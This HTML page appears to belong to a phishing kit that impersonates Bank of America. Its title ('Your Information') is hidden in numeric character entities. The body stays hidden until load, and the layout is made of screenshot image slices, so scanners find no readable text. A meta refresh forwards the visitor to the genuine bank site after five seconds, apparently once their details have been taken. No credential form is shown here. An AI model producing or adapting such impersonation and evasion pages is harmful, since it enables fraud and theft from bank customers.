<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#66;&#97;&#110;&#107;&#32;&#111;&#102;&#32;&#65;&#109;&#101;&#114;&#105;&#99;&#97;&#32;&#124;&#32;&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;&#32;&#124;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<html><meta http-equiv="Refresh" content="05; url=https://www.bankofamerica.com"></html>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:658px; width:1349px; height:129px; z-index:0"><img src="images/s15.png" alt="" title="" border=0 width=1349 height=129></div>

<div id="image1" style="position:absolute; overflow:hidden; left:227px; top:11px; width:987px; height:193px; z-index:1"><img src="images/s14.png" alt="" title="" border=0 width=987 height=193></div>

<div id="image4" style="position:absolute; overflow:hidden; left:1148px; top:22px; width:63px; height:13px; z-index:2"><a href="#"><img src="images/s13.png" alt="" title="" border=0 width=63 height=13></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:23px; top:706px; width:105px; height:14px; z-index:3"><a href="#"><img src="images/s5.png" alt="" title="" border=0 width=105 height=14></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:234px; top:734px; width:122px; height:13px; z-index:4"><a href="#"><img src="images/s6.png" alt="" title="" border=0 width=122 height=13></a></div>

</div>

</body>
</html>
